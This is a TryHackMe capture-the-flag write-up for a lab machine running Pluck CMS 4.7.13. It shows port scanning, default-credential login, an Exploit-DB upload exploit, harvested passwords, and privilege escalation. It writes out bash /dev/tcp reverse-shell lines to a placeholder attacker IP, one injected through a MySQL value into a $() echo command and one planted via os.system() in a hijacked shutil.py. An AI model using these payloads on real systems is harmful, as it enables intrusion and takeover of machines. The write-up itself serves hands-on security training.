Introduction 
-------------

This is an easy-level machine from Try Hack Me.  The objective of the machine is to find 3 flags of different users on the machine to solve this challenge.

Tools and Techniques used
-------------------------

*   Code Analysis
*   Net cat
*   python
*   MySQL

Initial Enumeration
-------------------

As the first step in the initial recon, our objective is to find the answer to the following question:  
Open ports and services running on these ports.  
 

Check the connectivity to the machine by using the ping command:

```text-plain
ping <IP>
```

If we receive a response from the machine, we can launch our port scans. If there is any issue with the connection, make sure you are connected to the VPN provided by Try Hack Me and perform the necessary steps to resolve the issue.

  
First, We will launch our first basic Nmap scan to quickly scan the surface of our machine.

Quick nmap scan:

```text-plain
nmap <IP>
```

 Result:

```text-plain
Starting Nmap 7.94SVN ( https://nmap.org ) at 2023-11-22 09:36 IST
Nmap scan report for <IP>
Host is up (0.15s latency).
Not shown: 998 closed tcp ports (conn-refused)
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http

Nmap done: 1 IP address (1 host up) scanned in 16.70 seconds
```

In the result, we can see two open ports on the machine. Let's enumerate further the services and versions of these services.

Deep Nmap scan:

```text-plain
nmap -sV -sC -O <IP> -p22,80
```

or 

```text-plain
nmap -A <IP> -p22,80
```

> \-sV : Probe open ports to determine service/version info
> 
> \-sC: try all the exploit scripts to find vulnerability.
> 
> \-O : Detect operating system.
> 
> \-p : to define ports (eg: - for all, 22,80 for port 22 and 80 only.)
> 
> \-A: will include -sV, -sC, -O  in one flag.

Both commands will return the same output. Read about these flags by `nmap --help` or `man nmap` .

Result:

```text-plain
Starting Nmap 7.94SVN ( https://nmap.org ) at 2023-11-22 09:41 IST
Nmap scan report for <IP>
Host is up (0.15s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 76:26:67:a6:b0:08:0e:ed:34:58:5b:4e:77:45:92:57 (RSA)
|   256 52:3a:ad:26:7f:6e:3f:23:f9:e4:ef:e8:5a:c8:42:5c (ECDSA)
|_  256 71:df:6e:81:f0:80:79:71:a8:da:2e:1e:56:c4:de:bb (ED25519)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: It works
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 12.03 seconds
```

Based on the available information from the result, we have a decent amount of details about the target machine. The operating system used by the target machine is Ubuntu. A basic SSH is running on port 22. Additionally, a web server, Apache, is running on port 80. With this information, we can determine our target and proceed accordingly.

### Web Application Enumeration

After accessing the URL, the default Apache web page appears. At this point, we can carry out several attacks and examine various locations to uncover interesting information. Checking the source code is important for finding information on web applications because developers may unintentionally reveal critical information in comments and code.

##### Directory Fuzzing

Let's launch a directory fuzzing attack to find paths for this web application since there is nothing interesting in the source code. I'm using `ffuf` you can use anything you like. You read more about \[ffuf\](https://github.com/ffuf/ffuf) .

```text-plain
ffuf -w /usr/share/wordlists/dirb/common.txt -u http://target-ip/FUZZ
```

Result:

```text-plain
app                     [Status: 301, Size: 312, Words: 20, Lines: 10, Duration: 432ms]
index.html              [Status: 200, Size: 10918, Words: 3499, Lines: 376, Duration: 153ms]
```

In the result of `ffuf`, we found two useful paths: `index.html` and `/app`. Since we are currently on the 'index.html' page, let's quickly check what's at '/app'.

![image](https://github.com/Itskmishra/Try-Hack-Me/assets/141756495/8c7cfdb6-112a-4d6a-9a4d-2cdaefcffe08)

After visiting the app page, we discovered another path `/pluck-4.7.13`. Upon clicking the path, we were redirected to `/app/pluck-4.7.13/?file=dreaming`. In the source code of the page, we found another path `/app/pluck-4.7.13/login.php`. 

![image](https://github.com/Itskmishra/Try-Hack-Me/assets/141756495/161d160c-8abb-4ea6-adb7-e99073c1afd9)

After pasting it after the initial URL, it will redirect to a login page. This login form is likely for admin.

![image](https://github.com/Itskmishra/Try-Hack-Me/assets/141756495/37d27e2a-b073-45fd-a7d7-3d950cb7fd08)

Before attempting to hack the login form and perform SQL injection, and other attacks. Hackers would typically conduct a quick search to gather information about the website, including details about the platform (CMS) and default credentials.


We can gather information about the pluck by clicking the link below the password field. Clicking on it redirects us to the GitHub page for Pluck, where more information can be found.  Let's search for the default login credentials for Pluck CMS. After going through some articles I have found that the default cred for pluck cms is “admin:password”. 

Log in with the found password redirects us to the dashboard for admin. 

![image](https://github.com/Itskmishra/Try-Hack-Me/assets/141756495/dfb13ba4-84b2-4cf1-a013-7061704c7af4)

The website doesn't offer much interesting information, except on certain pages where there are functionalities available such as uploads and creation tools. Initially, I thought that I could obtain a reverse shell by uploading a PHP payload and a polyglot payload disguised as an image to get a reverse shell.

After attempting to upload a file and an image, I noticed that neither of them resulted in a reverse shell. The file upload converted the uploaded file into a text file by adding .txt at the end. As for the image upload, it also did not return a reverse shell. At this point, I suspected that it could be a URL injection due to the tempting URL pattern, such as "action=xyz" and "file=xyz". However, when attempting to inject the URL, it returns a visually pleasing message as follows: 

![image](https://github.com/Itskmishra/Try-Hack-Me/assets/141756495/4452c653-1bd8-4296-b51f-98babeaddba8)

I'm feeling a little flustered at the moment. However, I've decided to revisit the basics of obtaining information about the web application. While doing so, I noticed the 'pluck-4.7.13'. It dawned on me that I hadn't searched for a vulnerability in the CMS version yet.

Then doing a quick pluck 4.7.13 version exploits returned me the solution to get a shell.

![image](https://github.com/Itskmishra/Try-Hack-Me/assets/141756495/eeb9b2f5-01ba-47df-a68d-fb5fbbeafb90)


So, we are logged in as admin and we are ready to exploit this vulnerability.

I have downloaded the exploit script onto my computer and saved it as `exploit.py` from exploit db. After reviewing the script, I understand the necessary parameters in order to make this work.

#### How this script works?

The following script requires the input of target IP, target port, password and the pluck CMS path. The script will authenticate us and generate an exploit with Powny shell and upload it to a file named “shell.phar”. Although it may seem simple, a lot is going on behind the scenes. I would recommend reviewing the code yourself at least once to fully understand the process.

executing the script.

```text-plain
python3 exploit.py <targetIp> 80 password /app/pluck-4.7.13
```

In the result, we can see a link. If we copy and paste it, we are redirected to the page where our exploit ran and return a session of powny shell.

Now we can execute a rev payload  on the target machine to establish a reverse shell to our local machine by running a netcat listener.

Setup the nc listener:

```text-plain
nc -nvlp 9999
```

command for target machine:

```text-plain
bash -c 'exec bash -i &>/dev/tcp/<attacker_ip>/<port> <&1'
```

Now we can stabilize the shell by different methods and ensure a stable connection and environment.

Privilege escalation
--------------------

In this part, we will try to elevate our users by horizontal and vertical privilege escalation methods.


Flag 1
------

To gain a better understanding, our first step is to thoroughly examine every directory and file for any useful information.

Upon examining all the files and folders in other directories, we discovered some interesting files in the '/opt' directory. Specifically, we found two files named getDreams.py and test.py. Interestingly, files with the same name "getDreams.py" are also present in Death's home directory. 

![image](https://github.com/Itskmishra/Try-Hack-Me/assets/141756495/e90b570c-3f4f-4343-ae94-053223fa51c4)

However, upon checking the file permissions, we noted that getDreams.py is owned by Death, while test.py is owned by Lucien. Despite this, we can read both files. To get a better understanding of their contents, we should read and analyze these files.

In test.py we  found the password for lucien:

![image](https://github.com/Itskmishra/Try-Hack-Me/assets/141756495/e35d3f3e-e37f-440e-9d9e-86d8484aa470)

Now we can try to log in with ssh with the following username and password:

```text-plain
ssh lucien@<target_ip>
```

After entering the password we started a session as lucien with ssh.

Now we can read `lucien_flag.txt` file:

```text-plain
cat lucien_flag.txt
```

Flag 2
------

We are currently logged in as Lucien and have obtained our first flag. Our next step is to continue enumerating in search of Death's password or any other potentially interesting information, such as the files we have discovered previously. To do this, we will begin by taking a look at the `getDreams.py` file located in the `/opt` directory and the files in the lucien current directory.

After analyzing the `.bash_history` file located in the home directory of Lucien, we discovered his MySQL credentials and that he is something with the "shutil.py" file in `/usr/lib/python3.8`. 

![image](https://github.com/Itskmishra/Try-Hack-Me/assets/141756495/2f73412b-7f6b-4374-8004-f05de3b72d57)

![image](https://github.com/Itskmishra/Try-Hack-Me/assets/141756495/490b3190-b23d-460f-83bb-a0dc0ab2e848)

If we examine the `.mysql_history` file and remove all the `/040`, we can assume that he was working with the "dreams" table in the "library" database. 

![image](https://github.com/Itskmishra/Try-Hack-Me/assets/141756495/f8ec90d4-edb7-4a04-98ef-6c4590645685)

We should use the discovered credentials to access the library database.

```text-plain
mysql -u lucien -p****************
```

list the database with `show databases;` :

![image](https://github.com/Itskmishra/Try-Hack-Me/assets/141756495/d27d5745-0d14-4bff-9ceb-82a79ff38a03)

Use this database with `use library;` and list all the tables in it using `show tables;` :

![image](https://github.com/Itskmishra/Try-Hack-Me/assets/141756495/aa6adc99-a65c-4f81-a032-5ea9801362d9)

list the data inside the dreams with `select * from dreams;` : 

![image](https://github.com/Itskmishra/Try-Hack-Me/assets/141756495/8d688375-84f1-4730-a628-218842a40c14)

Furthermore, we noticed that the getDreams.py script was used to retrieve the data from the "dreams" table, which was then displayed one by one using the "echo" command by user death but the password is redacted from the script.

![image](https://github.com/Itskmishra/Try-Hack-Me/assets/141756495/434538a5-e4f7-48b0-8300-f6389cdacccf)

If we check the user groups, we can see that lucien belongs to the sudo group. Let's run `sudo -l` to check which commands we can run with sudo.

![image](https://github.com/Itskmishra/Try-Hack-Me/assets/141756495/5a5750bf-6922-481f-ba6b-9d1ff917be57)

To clarify, the command "/usr/bin/python3 /home/death/getDreams.py" can be run as the user 'death'. This command executes the 'getDreams.py' script in the 'death' user's home directory using Python. By referencing the copy of this file in the '/opt' directory, we can determine the actions that will be performed by this script. The test is by executing this command in the terminal:

```text-plain
sudo -u death /usr/bin/python3 /home/death/getDreams.py
```

Result:

![image](https://github.com/Itskmishra/Try-Hack-Me/assets/141756495/1966eac7-ed2d-4995-ad26-4bce68cc7d5d)

Now that we know that we can insert data into the library database and retrieve it using the sudo command as death, let's attempt to exploit it by inserting a payload for the echo command.

Echo can execute commands inside strings if passed using "$()". You can test this by running the `whoami` command on your local machine like this `echo ‘$(whoami)’`.

![image](https://github.com/Itskmishra/Try-Hack-Me/assets/141756495/9b834831-2006-40d5-82d3-f4a6d0b9cd74)

The getDreams.py script retrieves and passes this data directly to the echo using python f-string. Let's test this by inserting a `whoami` payload into the dreams table and retrieving it using the sudo command.

To proceed, go to the library database as you have done before, and then run the following query:

```text-plain
INSERT INTO dreams (dreamer, dream) VALUES ('testuser', '$(whoami)');
```

This query is from the `.mysql_history` file in Lucien's home directory, with just a few minor tweaks. Now exit mysql and use sudo command to retrieve data from the database as death.

![image](https://github.com/Itskmishra/Try-Hack-Me/assets/141756495/1104a643-34d2-45b7-b4ef-143d9dd6187b)

In the result, we can see that the 'whoami' command was executed, returning the username of the user who executed it. Now Insert a reverse shell payload to get a shell from Death.

```text-plain
INSERT INTO dreams (dreamer, dream) VALUES ("revShell", "$(bash -c 'exec bash -i &>/dev/tcp/<your-local-machine-IP>/<port> <&1')");
```

Be careful when using quotes when passing a string inside a string. Use double quotes inside if used single outside and vice versa.

Start a listener on the port used in the payload.

```text-plain
nc -nlvp <port>
```

After running the sudo command, we were able to obtain the reverse shell as "death". You can now stabilize this shell using your preferred method.

Furthermore, while examining the "getDreams.py" file in the "death" home directory, I discovered a password. Upon using this password to log in via SSH, I was able to successfully gain access. Hence, I now have the password for both users.

![image](https://github.com/Itskmishra/Try-Hack-Me/assets/141756495/d0c526a0-55f8-406b-9b03-cfcd0faee82d)


By rerunning the sudo command, you can use the rev shell multiple times.

Now we can read `death_flag.txt` file

```text-plain
cat death_flag.txt
```

Flag 3
------
Now let's aim forward for the last flag inside the Morpheus directory. We have two readable files inside the Morpheus directory, so let's start enumerating by reading those files.

![image](https://github.com/Itskmishra/Try-Hack-Me/assets/141756495/398b018f-7ff5-4e93-b8ae-6873a227f4c3)


In the restore.py file, the script uses the copy2 function from the `shutil` library to copy the kingdom file to /kingdom_backup/kingdom.

![image](https://github.com/Itskmishra/Try-Hack-Me/assets/141756495/f0a09673-d8db-44e6-9f38-4406e301a10d)


 Additionally, we can read the kingdom file, which contains a single string that says "We saved the kingdom!".

If you recall, user Lucien is also doing something with `shutil` file. After inspecting the files in the death home directory, “.`viminfo` indicates that the user 'death' is also using `shutil` library for something.”

![image](https://github.com/Itskmishra/Try-Hack-Me/assets/141756495/d53c6ba8-e9e7-4ba8-923c-b4c0540501b5)

 
Let's check the `shutil.py` file. If we list the file permissions, we can see that user "death" has permission to read and write. This means we can use this file to do something with the "restore.py" script which is a backup script. Maybe there is a cronjob set for the script to run after a while. 

After checking for cronjobs, I was unable to find anything related to the restore.py file. Therefore, I'm going to use "pspy" a simple utility to monitor processes without root access. you can read more about it at \[pspy\](https://github.com/DominicBreuker/pspy) . I have pspy 64 bit.

Start a simple web server on my local machine in the directory where pspy is located using Python. 

```text-plain
python -m http.server 8080
// or 
python3 -m http.server 8080
```

Retrieved the file using `wget` and saved it in the `/tmp` directory of the target machine.

```text-plain
wget http://<vpn_IP>:8080/pspy64
```

Now change the permission to executable and run it using `./pspy64`.

If we monitor it for a while, we can see a restore.py being executed with Python and the user ID `1002`. 

![image](https://github.com/Itskmishra/Try-Hack-Me/assets/141756495/d44ce104-8c40-4989-b026-a9b3b3ce7c12)


If we check the `/etc/passwd` file for the user ID, we can notice that user Morpheus has an ID of `1002`. Moreover, this process runs every minute.

![image](https://github.com/Itskmishra/Try-Hack-Me/assets/141756495/e360d2a8-a2d0-41e6-ac85-618fd328e51d)

Now that we have established that the `restore.py` file utilizes shutil.py for the given task, and that the deaths have write permission on the `shutil.py` file, which is imported in `restore.py`, it is possible to exploit this by inserting some code within the `shutil.py` file and running it.

If we read the shutil file, we can see that `os` and `sys` are imported, which means we can use these libraries inside the `shutil.py` file. By using `os.system()`, we can execute shell commands from within the script. Let's try this theory by running the `whoami` command and storing the result inside a test file at `/tmp`.

Add this line of code after the imports:

```text-plain
os.system("whoami  > /tmp/test")
```

After making the necessary changes save the file and wait for a minute to see the result. A minute later a new file get created inside the `/tmp` dir.

![image](https://github.com/Itskmishra/Try-Hack-Me/assets/141756495/6fbdace2-e361-4d59-8818-5b9d8cd0b3c9)

This file is owned by Morpheus and if we read it, we can determine that the user is Morpheus. This can be exploited by executing a reverse shell payload as we did with "whoami". Replace the previous command with this rev shell payload and start a nc listener on the defined port.

```text-plain
os.system("bash -c 'exec bash -i &>/dev/tcp/<attacker-IP>/<port> <&1'")
```

After a minute we successfully received a rev shell with user morpheus. 

Now we can read the morpheus_flag.txt

```text-plain
cat morpheus_flag.txt
```

Conclusion
----------

This machine teaches us how simple things can lead to greater results, by paying attention to scripts, and code, and understanding the current working directory and files. Good luck in the future.

HAPPY HACKING :)





